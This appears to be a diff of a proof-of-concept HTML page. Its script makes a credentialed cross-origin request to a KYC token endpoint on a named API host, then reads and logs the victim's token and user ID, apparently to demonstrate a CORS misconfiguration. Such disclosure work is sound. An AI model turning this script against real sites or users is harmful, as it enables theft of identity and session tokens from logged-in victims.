@@ -12,20 +12,20 @@
   <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('GET', 'https://api.bpx.dev//wapi/v1/kyc/token', true);
+    req.open('GET', 'https://api.bpx.dev/wapi/v1/kyc/token', true);
     req.withCredentials = true;
     req.send();
 
     function reqListener() {
       try {
-        // Parse the JSON response
+        
         var response = JSON.parse(this.responseText); 
         
-        // Extract 'token' and 'userId' fields
+        
         var token = response.token;
         var userId = response.userId;
 
-        // Print the extracted data to the console
+        
         console.log('Token:', token);
         console.log('UserId:', userId);
       } catch (e) {
